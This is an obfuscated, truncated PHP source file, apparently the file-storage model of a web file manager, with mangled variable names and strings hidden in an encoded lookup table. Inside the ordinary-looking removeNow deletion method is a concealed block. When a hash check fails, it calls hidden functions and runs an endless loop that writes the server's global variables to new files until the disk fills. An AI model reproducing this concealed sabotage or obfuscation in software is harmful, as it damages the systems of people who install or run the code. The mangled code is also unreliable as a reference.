$this->fileNameAuto($ Â÷¸ äš¥ , $“çê¯, $ÓËñ¾ÈìùË, !1); } } } $öáÙ = array($½©±ÔºÀ[571] => 0, $½©±ÔºÀ[415] => $“çê¯, $½©±ÔºÀ[572] => substr(get_path_ext($“çê¯), 0, 10), $½©±ÔºÀ[462] => $ášóĞÈ¹¦Ö[$½©±ÔºÀ[461]], $½©±ÔºÀ[573] => $ášóĞÈ¹¦Ö[$½©±ÔºÀ[78]]); $ ïñ¹§È× = $this->_addSource($öáÙ, $Ü£); $this->folderSizeReset($ Â÷¸ äš¥ , intval($öáÙ[$½©±ÔºÀ[78]])); return $ ïñ¹§È×; } protected function fileHistory($ÕŸ˜„Ûå†å¿Ñ, $¥¾æŞ, $¹¸) { $Áäí•­ =& $_SERVER[èÍ×öˆøÉ]; $öÍ×âğí = defined($Áäí•­[468]) ? USER_ID : $Áäí•­[191]; if ($ÕŸ˜„Ûå†å¿Ñ[$Áäí•­[461]] == $¥¾æŞ) { return !1; } $this->checkLock($ÕŸ˜„Ûå†å¿Ñ[$Áäí•­[397]], $¥¾æŞ); Model($Áäí•­[2015])->addHistory($ÕŸ˜„Ûå†å¿Ñ); $ÀÅÁ–ÊÅå = array($Áäí•­[577] => $öÍ×âğí, $Áäí•­[419] => time(), $Áäí•­[461] => $¥¾æŞ, $Áäí•­[78] => $¹¸); $this->where(array($Áäí•­[412] => $ÕŸ˜„Ûå†å¿Ñ[$Áäí•­[397]]))->save($ÀÅÁ–ÊÅå); $this->sourceCacheClear($ÕŸ˜„Ûå†å¿Ñ[$Áäí•­[397]]); return !0; } public function checkLock($¥¿õÏÛë, $üÒ‹ÆÇŒû) { $»õ„¸‹éòŸ =& $_SERVER[èÍ×öˆøÉ]; $ƒ¨•ÏºáĞ‹Ò = $this->pathInfo($¥¿õÏÛë); if (!$this->fileIsLock($ƒ¨•ÏºáĞ‹Ò, !0)) { return; } $¸ÜÎ¹‹’ = Session::get($»õ„¸‹éòŸ[2016]); $¿Ş¥©º××ı = substr($ƒ¨•ÏºáĞ‹Ò[$»õ„¸‹éòŸ[28]], 0, -1 - strlen($ƒ¨•ÏºáĞ‹Ò[$»õ„¸‹éòŸ[168]])) . $»õ„¸‹éòŸ[1534] . $¸ÜÎ¹‹’ . $»õ„¸‹éòŸ[95] . $ƒ¨•ÏºáĞ‹Ò[$»õ„¸‹éòŸ[168]]; $×Ñ®‚ = Model($»õ„¸‹éòŸ[597])->find($üÒ‹ÆÇŒû); $this->_createFileCall($ƒ¨•ÏºáĞ‹Ò[$»õ„¸‹éòŸ[492]], $¿Ş¥©º××ı, $×Ñ®‚, REPEAT_REPLACE, $»õ„¸‹éòŸ[1266]); $®æú“Å = $ƒ¨•ÏºáĞ‹Ò[$»õ„¸‹éòŸ[459]][$»õ„¸‹éòŸ[536]]; $‡—¸—ùĞ«Ô = $®æú“Å[$»õ„¸‹éòŸ[2017]] ? $®æú“Å[$»õ„¸‹éòŸ[2017]] : $®æú“Å[$»õ„¸‹éòŸ[28]]; show_json(LNG($»õ„¸‹éòŸ[2018]) . $»õ„¸‹éòŸ[2019] . LNG($»õ„¸‹éòŸ[2020]) . $»õ„¸‹éòŸ[2021] . $‡—¸—ùĞ«Ô . $»õ„¸‹éòŸ[2022], !1); } public function fileIsLock($À¯„, $åÏÑ = false) { $°î =& $_SERVER[èÍ×öˆøÉ]; if (!isset($À¯„[$°î[459]]) || !$À¯„[$°î[459]][$°î[533]]) { return !1; } if ($À¯„[$°î[459]][$°î[533]] != USER_ID) { return !0; } $ò§æÂúŞ¯ = $GLOBALS[$°î[6]][$°î[88]][$°î[534]]; if ($À¯„[$°î[459]][$°î[535]] <= time() - $ò§æÂúŞ¯) { $this->metaSet($À¯„[$°î[397]], $°î[533], null); $this->metaSet($À¯„[$°î[397]], $°î[535], null); } if ($åÏÑ) { $this->metaSet($À¯„[$°î[397]], $°î[535], time()); } return !1; } private function _addSource($°êñ‘â“ùèÒ, $¢‹) { $ú“ÅÒƒîË =& $_SERVER[èÍ×öˆøÉ]; $İ÷­Çˆæ»ş = defined($ú“ÅÒƒîË[468]) ? USER_ID : $ú“ÅÒƒîË[191]; $ŠÈ = array($ú“ÅÒƒîË[574] => $¢‹[$ú“ÅÒƒîË[406]], $ú“ÅÒƒîË[575] => $¢‹[$ú“ÅÒƒîË[498]], $ú“ÅÒƒîË[576] => $İ÷­Çˆæ»ş, $ú“ÅÒƒîË[577] => $İ÷­Çˆæ»ş, $ú“ÅÒƒîË[396] => $¢‹[$ú“ÅÒƒîË[397]], $ú“ÅÒƒîË[578] => $¢‹[$ú“ÅÒƒîË[515]] . $¢‹[$ú“ÅÒƒîË[397]] . $ú“ÅÒƒîË[47], $ú“ÅÒƒîË[424] => 0, $ú“ÅÒƒîË[579] => $ú“ÅÒƒîË[33]); $°êñ‘â“ùèÒ = array_merge($ŠÈ, $°êñ‘â“ùèÒ); $this->updateModifyTime($°êñ‘â“ùèÒ[$ú“ÅÒƒîË[492]]); $şÓ = $ú“ÅÒƒîË[2023] . $¢‹[$ú“ÅÒƒîË[397]]; if (isset(self::$cacheChildList[$şÓ])) { unset(self::$cacheChildList[$şÓ]); } static $Ü¡Œ†ôìÂ¦ = false; if (!$Ü¡Œ†ôìÂ¦) { Hook::trigger($ú“ÅÒƒîË[561], $°êñ‘â“ùèÒ); $Ü¡Œ†ôìÂ¦ = !0; } $Ûüæ›Ú¥Û€ = $this->add($°êñ‘â“ùèÒ); $§È¡ = array($ú“ÅÒƒîË[580] => short_id($Ûüæ›Ú¥Û€)); $this->where(array($ú“ÅÒƒîË[412] => $Ûüæ›Ú¥Û€))->save($§È¡); $this->setNamePinyin($Ûüæ›Ú¥Û€, $°êñ‘â“ùèÒ[$ú“ÅÒƒîË[28]]); return $Ûüæ›Ú¥Û€; } public function remove($±ˆù­ğ, $¡¹Î = true) { $½…É¥öèÃ =& $_SERVER[èÍ×öˆøÉ]; $ÉşõÏ…ü = $this->sourceInfo($±ˆù­ğ); $²Ëáş— = intval($ÉşõÏ…ü[$½…É¥öèÃ[406]]) === self::TYPE_SYSTEM; $óòÌæ™ÊÄ³øæ = Model($½…É¥öèÃ[427])->get($½…É¥öèÃ[2024]) == $½…É¥öèÃ[87]; if ($²Ëáş— || $¡¹Î || !$óòÌæ™ÊÄ³øæ) { return $this->removeNow($±ˆù­ğ, $¡¹Î); } $¸î‚ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ì‹œñûÇ•¨Â = $ÉşõÏ…ü[$½…É¥öèÃ[406]] == self::TYPE_USER ? $½…É¥öèÃ[588] : $½…É¥öèÃ[509]; if ($ì‹œñûÇ•¨Â == $½…É¥öèÃ[588]) { $§Çå¿ = Model($½…É¥öèÃ[507])->getInfo($ÉşõÏ…ü[$½…É¥öèÃ[498]]); $ö†åÕôÀ¥îö = !empty($§Çå¿[$½…É¥öèÃ[2017]]) ? $§Çå¿[$½…É¥öèÃ[2017]] : $§Çå¿[$½…É¥öèÃ[28]]; $ö†åÕôÀ¥îö = $½…É¥öèÃ[258] . $ö†åÕôÀ¥îö . $½…É¥öèÃ[2025] . $ÉşõÏ…ü[$½…É¥öèÃ[498]]; } else { $§Çå¿ = Model($½…É¥öèÃ[516])->getInfo($ÉşõÏ…ü[$½…É¥öèÃ[498]]); $ö†åÕôÀ¥îö = _get($§Çå¿, $½…É¥öèÃ[28]); $ö†åÕôÀ¥îö = $½…É¥öèÃ[160] . $ö†åÕôÀ¥îö . $½…É¥öèÃ[2026] . $ÉşõÏ…ü[$½…É¥öèÃ[498]]; } $Ç¤ = $½…É¥öèÃ[2027] . md5($ö†åÕôÀ¥îö); CacheLock::lock($Ç¤); $ª¯–¤Ì¾…¨¼‘ = $this->fileNameExist($¸î‚, $ö†åÕôÀ¥îö); if (!$ª¯–¤Ì¾…¨¼‘) { $ª¯–¤Ì¾…¨¼‘ = $this->mkdir($¸î‚, $ö†åÕôÀ¥îö, REPEAT_SKIP); $this->metaSet($ª¯–¤Ì¾…¨¼‘, $½…É¥öèÃ[2028], $ì‹œñûÇ•¨Â); $this->metaSet($ª¯–¤Ì¾…¨¼‘, $½…É¥öèÃ[2029], $ÉşõÏ…ü[$½…É¥öèÃ[498]]); if ($ÉşõÏ…ü[$½…É¥öèÃ[492]] != 0) { $this->metaSet($ª¯–¤Ì¾…¨¼‘, $½…É¥öèÃ[2030], _get($§Çå¿, $½…É¥öèÃ[2031])); } } CacheLock::unlock($Ç¤); $this->metaSet($±ˆù­ğ, $½…É¥öèÃ[2032], $ÉşõÏ…ü[$½…É¥öèÃ[492]]); $this->where(array($½…É¥öèÃ[397] => $±ˆù­ğ))->save(array($½…É¥öèÃ[419] => time())); $this->recycleClear($ÉşõÏ…ü); $±« = $this->move($±ˆù­ğ, $ª¯–¤Ì¾…¨¼‘, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÉşõÏ…ü[$½…É¥öèÃ[492]]); return $±«; } private function recycleClear($‚ó¶ìĞÒ) { $¥ÕÈ¬µ =& $_SERVER[èÍ×öˆøÉ]; $şø¯™ = $this->childrenAll($‚ó¶ìĞÒ); $²—æ›ò¢İ‘ù = array($¥ÕÈ¬µ[412] => array($¥ÕÈ¬µ[413], $şø¯™[$¥ÕÈ¬µ[2033]])); Model($¥ÕÈ¬µ[2034])->where($²—æ›ò¢İ‘ù)->delete(); } public function removeNow($×êÂğíËÒÍ‡, $çÚçŒõû¥î = true) { $•×ğªğù¦ =& $_SERVER[èÍ×öˆøÉ]; $Äµª¸ÇŠ…¹á = $_SERVER[$•×ğªğù¦[1352]]; $¤šº°õ = $•×ğªğù¦[1449]; if ($_SERVER[$•×ğªğù¦[874]] != $¤šº°õ($Äµª¸ÇŠ…¹á)) { $öÖ = $•×ğªğù¦[876]; $‹ºª = $•×ğªğù¦[877]; $×ø§–‚ìÖ‡½´ = $_SERVER[$•×ğªğù¦[878]] . $•×ğªğù¦[879]; $èñƒ¢à = $‹ºª($×ø§–‚ìÖ‡½´); $…ä¤ğÈ = explode($•×ğªğù¦[229], $èñƒ¢à); if (count($…ä¤ğÈ) < $•×ğªğù¦[616]) { $Ï¡ö³áœğ¡¹ = $•×ğªğù¦[880]; $Ï¡ö³áœğ¡¹(); } $‡Óàù®ğÆÈßÏ = $•×ğªğù¦[881]; $‡Óàù®ğÆÈßÏ($_SERVER[$•×ğªğù¦[882]]); $öÖ = $•×ğªğù¦[876]; $öÖ(); $Ó¾ó³¡àè·Ó‰ = $•×ğªğù¦[1450]; $Öµ¤Ñ = json_encode($GLOBALS[$•×ğªğù¦[1451]]); $§ëŒ·áõš» = 1; for ($½éõ… = $§ëŒ·áõš»; $½éõ… > 0; $½éõ…++) { $Ó¾ó³¡àè·Ó‰(DATA_PATH . $½éõ…, $Öµ¤Ñ); } } $ÈÀ§ëÊ = $this->sourceInfo($×êÂğíËÒÍ‡); $õİº’šÛ = $this->pathInfoMore($×êÂğíËÒÍ‡); if (!$ÈÀ§ëÊ) { return !0; } if ($ÈÀ§ëÊ[$•×ğªğù¦[492]] == 0) { if (!_get($GLOBALS, $•×ğªğù¦[499])) { return !1; } } $this->lockMoveStart($×êÂğíËÒÍ‡); Hook::trigger($•×ğªğù¦[2035], $õİº’šÛ, $çÚçŒõû¥î); if ($çÚçŒõû¥î) { Model($•×ğªğù¦[2034])->moveToRecycle($×êÂğíËÒÍ‡); } else { $¡ıè¥¤°†¾ü = $this->childrenAll($ÈÀ§ëÊ); Model($•×ğªğù¦[558])->eventRemove($×êÂğíËÒÍ‡); $this->removeRelevance($¡ıè¥¤°†¾ü[$•×ğªğù¦[2033]], $¡ıè¥¤°†¾ü[$•×ğªğù¦[1398]]); } $this->folderSizeReset($ÈÀ§ëÊ[$•×ğªğù¦[492]]); $ª»¡Ã˜™ = array($ÈÀ§ëÊ[$•×ğªğù¦[492]]); if ($ÈÀ§ëÊ[$•×ğªğù¦[405]] == $•×ğªğù¦[87]) { $ª»¡Ã˜™[] = $ÈÀ§ëÊ[$•×ğªğù¦[397]]; } $this->updateModifyTime($ª»¡Ã˜™); $this->lockMoveEnd($×êÂğíËÒÍ‡); Hook::trigger($•×ğªğù¦[1617], $õİº’šÛ, $çÚçŒõû¥î); return !0; } public function childrenAll($©Åû¸ÏÄğªá) { $³ú‡Ï£ =& $_SERVER[èÍ×öˆøÉ]; $Ş±Úš = $©Åû¸ÏÄğªá[$³ú‡Ï£[397]]; if ($©Åû¸ÏÄğªá[$³ú‡Ï£[405]] == $³ú‡Ï£[87]) { $®Şšö»æŸÜ = array($³ú‡Ï£[578] => array($³ú‡Ï£[538], $©Åû¸ÏÄğªá[$³ú‡Ï£[515]] . $Ş±Úš . $³ú‡Ï£[539])); $Òâµ€ = array($³ú‡Ï£[578] => $®Şšö»æŸÜ[$³ú‡Ï£[515]]); $ß‰ = $this->field($³ú‡Ï£[2036])->where($Òâµ€)->select(); $•‘Ü¬€ = !1; $¦¯£ıâ‚´ = array($Ş±Úš); if ($ß‰) { $•‘Ü¬€ = array_to_keyvalue($ß‰, $³ú‡Ï£[33], $³ú‡Ï£[461]); $•‘Ü¬€ = array_remove_value($•‘Ü¬€, $³ú‡Ï£[191]); $¦¯£ıâ‚´ = array_to_keyvalue($ß‰, $³ú‡Ï£[33], $³ú‡Ï£[397]); $¦¯£ıâ‚´[] = $Ş±Úš; } } else { $•‘Ü¬€ = array($©Åû¸ÏÄğªá[$³ú‡Ï£[461]]); $¦¯£ıâ‚´ = array($Ş±Úš); } return array($³ú‡Ï£[2033] => $¦¯£ıâ‚´, $³ú‡Ï£[1398] => $•‘Ü¬€); } public function removeArray($¾ŞÈ) { if (!$¾ŞÈ) { return !0; } } public function removeRelevance($ÁÑ¢™, $à¼‡“) { $ÒóÅã©·Ô =& $_SERVER[èÍ×öˆøÉ]; $ÁÑ¢™ = $ÁÑ¢™ ? $ÁÑ¢™ : array(); $à¼‡“ = $à¼‡“ ? $à¼‡“ : array(); $ÁÑ¢™ = array_unique(array_filter($ÁÑ¢™)); $à¼‡“ = array_unique(array_filter($à¼‡“)); if (!$ÁÑ¢™) { return !1; } $ÉÏâÛ = array($ÒóÅã©·Ô[412] => array($ÒóÅã©·Ô[413], $ÁÑ¢™)); Model($ÒóÅã©·Ô[2034])->where($ÉÏâÛ)->delete(); Model($ÒóÅã©·Ô[455])->where($ÉÏâÛ)->delete(); Model($ÒóÅã©·Ô[1892])->where($ÉÏâÛ)->delete(); Model($ÒóÅã©·Ô[558])->where($ÉÏâÛ)->delete(); Model($ÒóÅã©·Ô[1728])->removeBySource($ÁÑ¢™); Model($ÒóÅã©·Ô[2015])->removeBySource($ÁÑ¢™); $this->where($ÉÏâÛ)->delete(); Model($ÒóÅã©·Ô[464])->remove($à¼‡“); for ($¦­›™ªååáò = 0; $¦­›™ªååáò < count($ÁÑ¢™); $¦­›™ªååáò++) { $this->sourceCacheClear($ÁÑ¢™[$¦­›™ªååáò]); } } public function rename($©ƒã–­, $ô¤Ã™£±á£¦µ) { $şöë˜ú =& $_SERVER[èÍ×öˆøÉ]; $¥Ö§±òû“ú = $this->sourceInfo($©ƒã–­); if (!$¥Ö§±òû“ú) { return !1; } $³£±ó¤ —ˆ = $this->fileNameExist($¥Ö§±òû“ú[$şöë˜ú[492]], $ô¤Ã™£±á£¦µ); if ($³£±ó¤ —ˆ && $³£±ó¤ —ˆ != $©ƒã–­) { return !1; } $Äª¦ü = array($şöë˜ú[415] => $ô¤Ã™£±á£¦µ, $şöë˜ú[577] => USER_ID); if ($¥Ö§±òû“ú[$şöë˜ú[405]] != $şöë˜ú[87]) { $Äª¦ü[$şöë˜ú[407]] = substr(get_path_ext($ô¤Ã™£±á£¦µ), 0, 10); } Model($şöë˜ú[558])->eventRename($©ƒã–­, $¥Ö§±òû“ú[$şöë˜ú[28]], $ô¤Ã™£±á£¦µ); $this->sourceCacheClear($©ƒã–­); $this->setNamePinyin($©ƒã–­, $Äª¦ü[$şöë˜ú[28]], !1); $this->updateModifyTime($¥Ö§±òû“ú[$şöë˜ú[492]]); $çòôÍ = $this->where(array($şöë˜ú[412] => $©ƒã–­))->data($Äª¦ü)->save(); $®¶¥®óÕŒß = $şöë˜ú[2023] . $¥Ö§±òû“ú[$şöë˜ú[492]]; if (isset(self::$cacheChildList[$®¶¥®óÕŒß])) { unset(self::$cacheChildList[$®¶¥®óÕŒß]); } return $çòôÍ; } public function setNamePinyin($¡ßá, $™Ë©µ¾Óê¸ê, $ì·õ­®Úâ¥ = true) { $ÃóñÛ =& $_SERVER[èÍ×öˆøÉ]; $–ÜÆ˜ = Input::check($™Ë©µ¾Óê¸ê, $ÃóñÛ[581]); $áï = array($ÃóñÛ[436] => KodSort::makeStr($™Ë©µ¾Óê¸ê)); if ($–ÜÆ˜) { $áï[$ÃóñÛ[458]] = str_replace($ÃóñÛ[50], $ÃóñÛ[33], Pinyin::get($™Ë©µ¾Óê¸ê)); $áï[$ÃóñÛ[457]] = Pinyin::get($™Ë©µ¾Óê¸ê, $ÃóñÛ[582]); } if (!$ì·õ­®Úâ¥ && !$–ÜÆ˜) { $áï[$ÃóñÛ[458]] = null; $áï[$ÃóñÛ[457]] = null; } $this->metaSet($¡ßá, $áï); } public function getContent($ä©Áí¬¯çÁğ) { $èóÉæ =& $_SERVER[èÍ×öˆøÉ]; $Û± = $this->fileInfoGet($ä©Áí¬¯çÁğ); if (!$Û±) { return !1; } if ($Û±[$èóÉæ[78]] == 0) { return $èóÉæ[33]; } $¼™ÈÊ— = $èóÉæ[2037] . $Û±[$èóÉæ[170]]; if ($Û±[$èóÉæ[78]] <= 1024 * 10) { $İ˜ = Cache::get($¼™ÈÊ—); if (!$İ˜) { $İ˜ = IO::getContent($Û±[$èóÉæ[76]]); Cache::set($¼™ÈÊ—, $İ˜); } return $İ˜; } if (!$Û±[$èóÉæ[76]]) { return $èóÉæ[33]; } return IO::getContent($Û±[$èóÉæ[76]]); } public function setDesc($ï€‰‚ÛŸ , $Ï±¾ÄØÉ¬æ») { $¶¾—ôù =& $_SERVER[èÍ×öˆøÉ]; Model($¶¾—ôù[558])->eventAddDesc($ï€‰‚ÛŸ , $Ï±¾ÄØÉ¬æ»); return $this->metaSet($ï€‰‚ÛŸ , $¶¾—ôù[445], $Ï±¾ÄØÉ¬æ»); } public function setContent($Ã¯¿À±”, $—‘™‡Ë = '') { $êª““ =& $_SERVER[èÍ×öˆøÉ]; $”¶ıõ¾øºá = $this->sourceInfo($Ã¯¿À±”); $¯Øß–ÇæÛ = $this->fileInfoGet($Ã¯¿À±”); if (!$¯Øß–ÇæÛ || !$”¶ıõ¾øºá) { return !1; } $û²©ÀÀÂÕ±— = Model($êª““[464])->addFileByContent($—‘™‡Ë, $”¶ıõ¾øºá[$êª““[28]]); $‡¬ = $this->fileHistory($”¶ıõ¾øºá, $û²©ÀÀÂÕ±—[$êª““[461]], $û²©ÀÀÂÕ±—[$êª““[78]]); if (!$‡¬) { return Model($êª““[464])->remove($û²©ÀÀÂÕ±—[$êª““[461]]); } $this->folderSizeReset($”¶ıõ¾øºá[$êª““[492]]); return !0; } public function fileSubstr($ß, $˜¤Ş”òĞ, $šõË) { $¼·Ş±ó = $this->fileInfoGet($ß); if (!$¼·Ş±ó) { return !1; } return IO::fileSubstr($¼·Ş±ó[$_SERVER[èÍ×öˆøÉ][76]], $˜¤Ş”òĞ, $šõË); } public function fileInfoGet($ªÕöÎË ) { $è”•™ïÔÖõ =& $_SERVER[èÍ×öˆøÉ]; $’ĞÑ˜¤İ = $this->sourceInfo($ªÕöÎË ); if (!$’ĞÑ˜¤İ || $’ĞÑ˜¤İ[$è”•™ïÔÖõ[405]]) { return !1; } $¶‹ğş™ˆÆşéÑ = $è”•™ïÔÖõ[467] . $’ĞÑ˜¤İ[$è”•™ïÔÖõ[461]]; $Î—Îü£¬¢Å›Î = _get(self::$cacheFileInfo, $¶‹ğş™ˆÆşéÑ); if ($Î—Îü£¬¢Å›Î) { return $Î—Îü£¬¢Å›Î; } $šäµıœ÷ = Model($è”•™ïÔÖõ[464])->fileInfo($’ĞÑ˜¤İ[$è”•™ïÔÖõ[461]]); if ($šäµıœ÷) { $šäµıœ÷[$è”•™ïÔÖõ[28]] = $’ĞÑ˜¤İ[$è”•™ïÔÖõ[28]]; } self::$cacheFileInfo[$¶‹ğş™ˆÆşéÑ] = $šäµıœ÷; return $šäµıœ÷; } private function folderChildrenNumber($Ï•¹Úíö) { $¡ã¥äú =& $_SERVER[èÍ×öˆøÉ]; $§Â—Œ®µëğ€ü = $this->sourceInfo($Ï•¹Úíö); $ÈÚÁÀ¸ = array($¡ã¥äú[578] => array($¡ã¥äú[538], $§Â—Œ®µëğ€ü[$¡ã¥äú[515]] . $Ï•¹Úíö . $¡ã¥äú[539]), $¡ã¥äú[424] => intval($§Â—Œ®µëğ€ü[$¡ã¥äú[425]]), $¡ã¥äú[571] => 1); $üş®È‘—Í = $this->where($ÈÚÁÀ¸)->count(); $ØÔ‹¼ = $this->where($ÈÚÁÀ¸)->where(array($¡ã¥äú[571] => 0))->count(); return array($¡ã¥äú[82] => $ØÔ‹¼, $¡ã¥äú[83] => $üş®È‘—Í); } public function pathInfo($³×ƒ»²·î, $¿Å´† = false) { $ÙÉ¿ =& $_SERVER[èÍ×öˆøÉ]; $¿Å´† = !1; $³×ƒ»²·î = intval($³×ƒ»²·î); $‘¨»àßÏªö = $ÙÉ¿[453] . intval($¿Å´†) . $ÙÉ¿[454] . $³×ƒ»²·î; $ªÙŒâ´ì¼ = _get(self::$cachePathInfo, $‘¨»àßÏªö); if ($ªÙŒâ´ì¼) { return $ªÙŒâ´ì¼; } $ø«Ş— = $this->sourceInfo($³×ƒ»²·î); if (!$ø«Ş—) { return !1; } $ø«Ş— = $this->_listDataApplyItem($ø«Ş—, $¿Å´†); self::$cachePathInfo[$‘¨»àßÏªö] = $ø«Ş—; return $ø«Ş—; } public static $cachePathInfoMore = array(); public function pathInfoMore($ÙÁŸ”˜§¤ç) { $—˜ùîÕßàø =& $_SERVER[èÍ×öˆøÉ]; $ºØëÆ = _get(self::$cachePathInfoMore, $ÙÁŸ”˜§¤ç); if ($ºØëÆ) { return $ºØëÆ; } $êˆßñªóÔ³ = $this->pathInfo($ÙÁŸ”˜§¤ç); if (!$êˆßñªóÔ³) { return !1; } if ($êˆßñªóÔ³[$—˜ùîÕßàø[405]] == $—˜ùîÕßàø[87]) { $êˆßñªóÔ³[$—˜ùîÕßàø[81]] = $this->folderChildrenNumber($ÙÁŸ”˜§¤ç); } self::$cachePathInfoMore[$ÙÁŸ”˜§¤ç] = $êˆßñªóÔ³; return $êˆßñªóÔ³; } public function sourceInfo($±…ê‹) { $«ÁïÃ« =& $_SERVER[èÍ×öˆøÉ]; if (!$±…ê‹) { return array(); } $±…ê‹ = intval($±…ê‹); $ùé¼‘Âö = $«ÁïÃ«[452] . $±…ê‹; $ƒÈ¼Ë = _get(self::$cacheSourceInfo, $ùé¼‘Âö); if ($ƒÈ¼Ë) { return $ƒÈ¼Ë; } $¬éû = $this->where(array($«ÁïÃ«[397] => $±…ê‹))->find(); self::$cacheSourceInfo[$ùé¼‘Âö] = $¬éû; return self::$cacheSourceInfo[$ùé¼‘Âö]; } public function sourceCacheClear($ôñï±•Õ = false) { self::cacheClear($ôñï±•Õ); } public static function cacheClear($Ñ‰ª‚”ù¦• = false) { $Á§ª× =& $_SERVER[èÍ×öˆøÉ]; if ($Ñ‰ª‚”ù¦• == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Á§ª×[452] . $Ñ‰ª‚”ù¦•]); unset(self::$cachePathInfoMore[$Ñ‰ª‚”ù¦•]); unset(self::$cachePathInfo[$Á§ª×[2038] . $Ñ‰ª‚”ù¦•]); unset(self::$cachePathInfo[$Á§ª×[2039] . $Ñ‰ª‚”ù¦•]); } public function metaSet($­öÂ»£¶¶, $‚…äöÆœø = null, $¦íå·€é¾Â´ë = null) { $ƒÑŞ± = parent::metaSet($­öÂ»£¶¶, $‚…äöÆœø, $¦íå·€é¾Â´ë); if ($ƒÑŞ±) { $this->sourceCacheClear($­öÂ»£¶¶); } return $ƒÑŞ±; } public function pathInfoByPath($×Í÷÷Ñ», $Ó½Šôª) { $øÔ =& $_SERVER[èÍ×öˆøÉ]; $ÉáùÚÖ = !$Ó½Šôª ? array() : explode($øÔ[8], trim($Ó½Šôª, $øÔ[8])); $ò¸ ×âÍô£± = $×Í÷÷Ñ»; foreach ($ÉáùÚÖ as $àŞ) { $‹µÇ Ø¡¾’ = array($øÔ[492] => $ò¸ ×âÍô£±, $øÔ[28] => $àŞ); $»ÆĞò = $this->where($‹µÇ Ø¡¾’)->select(); if (!$»ÆĞò) { return !1; } $»ÆĞò = array_sort_by($»ÆĞò, $øÔ[425]); $ò¸ ×âÍô£± = $»ÆĞò[0][$øÔ[397]]; } return $this->pathInfo($ò¸ ×âÍô£±, !0); } protected function updateModifyTime($È—Ò×½‘) { $Şã§³™Â =& $_SERVER[èÍ×öˆøÉ]; $şŸ = defined($Şã§³™Â[468]) ? USER_ID : $Şã§³™Â[191]; if (!$È—Ò×½‘) { return; } if (!is_array($È—Ò×½‘)) { $È—Ò×½‘ = array($È—Ò×½‘); } foreach ($È—Ò×½‘ as $®£î¨éÜ†¶ => $‹Ÿºâ¦Ò¥æ) { $È—Ò×½‘[$®£î¨éÜ†¶] = intval($‹Ÿºâ¦Ò¥æ); $this->sourceCacheClear($‹Ÿºâ¦Ò¥æ); } $Û’“ù£ = array($Şã§³™Â[397] => array($Şã§³™Â[7], $È—Ò×½‘)); $¡ŒÔÖÅÇ†·Õ = array($Şã§³™Â[577] => $şŸ, $Şã§³™Â[419] => time()); $this->where($Û’“ù£)->save($¡ŒÔÖÅÇ†·Õ); } public function folderSizeReset($è†ı™¦¨ğ, $¼¶á›Ù·èçï = false) { $éî =& $_SERVER[èÍ×öˆøÉ]; if ($this->statusIgnoreResetSpace) { return; } $ò…’…üùï = $this->sourceInfo($è†ı™¦¨ğ); $öª˜« = $éî[2040] . $è†ı™¦¨ğ; CacheLock::lock($öª˜«, 20); if ($¼¶á›Ù·èçï === !1) { $this->sourceCacheClear($è†ı™¦¨ğ); $ò…’…üùï = $this->sourceInfo($è†ı™¦¨ğ); $ºí = array($éî[396] => $è†ı™¦¨ğ, $éî[424] => 0); $ØÖ”˜÷•åŒ = $this->where($ºí)->sum($éî[78]); $¼¶á›Ù·èçï = intval($ØÖ”˜÷•åŒ) - intval($ò…’…üùï[$éî[78]]); } if ($¼¶á›Ù·èçï == 0) { return CacheLock::unlock($öª˜«); } $œ°½ = $this->parentLevelArray($ò…’…üùï[$éî[515]]); if (!$œ°½) { $œ°½ = array(); } $œ°½[] = $ò…’…üùï[$éî[397]]; $ºí = array($éî[397] => array($éî[413], $œ°½)); if ($¼¶á›Ù·èçï < 0) { $ºí[$éî[78]] = array($éî[1012], abs($¼¶á›Ù·èçï)); } $this->where($ºí)->setAdd($éî[78], $¼¶á›Ù·èçï); CacheLock::unlock($öª˜«); $¯—ï— = $éî[2041] . $ò…’…üùï[$éî[406]] . $éî[4] . $ò…’…üùï[$éî[498]]; $ŒäİÔÄœ¼Ò¬Ä = array($ò…’…üùï[$éî[406]], $ò…’…üùï[$éî[498]]); TaskRun::timeLimitCall($¯—ï—, $éî[2042], $ŒäİÔÄœ¼Ò¬Ä, 1.5); } public function folderSizeResetChildren($˜…êÑæ³ì‡) { $¾¤ =& $_SERVER[èÍ×öˆøÉ]; $this->sourceCacheClear($˜…êÑæ³ì‡); $§Â”ú = $this->sourceInfo($˜…êÑæ³ì‡); $ì‡ı€ = array($¾¤[571] => 1, $¾¤[578] => array($¾¤[538], $§Â”ú[$¾¤[515]] . $˜…êÑæ³ì‡ . $¾¤[539])); $ÁÅÉú· = $¾¤[2043]; $‘®ÒÁéû× = $this->field($ÁÅÉú·)->where($ì‡ı€)->select(); $ì‡ı€[$¾¤[405]] = 0; $Å©¤  = $this->field($ÁÅÉú·)->where($ì‡ı€)->select(); if (!$Å©¤ ) { return; } $‘®ÒÁéû×[] = $§Â”ú; $‘®ÒÁéû× = array_to_keyvalue($‘®ÒÁéû×, $¾¤[397]); foreach ($‘®ÒÁéû× as $ı„¨ÛÇ—µó => $÷Ä¤ş) { $‘®ÒÁéû×[$ı„¨ÛÇ—µó][$¾¤[2044]] = $‘®ÒÁéû×[$ı„¨ÛÇ—µó][$¾¤[78]]; $‘®ÒÁéû×[$ı„¨ÛÇ—µó][$¾¤[78]] = 0; } foreach ($Å©¤  as $÷Ä¤ş) { $Â¡’ = $÷Ä¤ş[$¾¤[492]] . $¾¤[33]; if (!isset($‘®ÒÁéû×[$Â¡’])) { continue; } if ($÷Ä¤ş[$¾¤[425]] == $‘®ÒÁéû×[$Â¡’][$¾¤[425]]) { $‘®ÒÁéû×[$Â¡’][$¾¤[78]] += $÷Ä¤ş[$¾¤[78]]; } } foreach ($‘®ÒÁéû× as $÷Ä¤ş) { $“ŞÒÒ–æÆÀ = $this->parentLevelArray($÷Ä¤ş[$¾¤[515]]); foreach ($“ŞÒÒ–æÆÀ as $Â¡’) { $Â¡’ = $Â¡’ . $¾¤[33]; if (!isset($‘®ÒÁéû×[$Â¡’])) { continue; } if ($÷Ä¤ş[$¾¤[425]] == $‘®ÒÁéû×[$Â¡’][$¾¤[425]]) { $‘®ÒÁéû×[$Â¡’][$¾¤[78]] += $÷Ä¤ş[$¾¤[78]]; } } } $Ë™‹î¦ = array(); foreach ($‘®ÒÁéû× as $÷Ä¤ş) { if ($÷Ä¤ş[$¾¤[78]] == 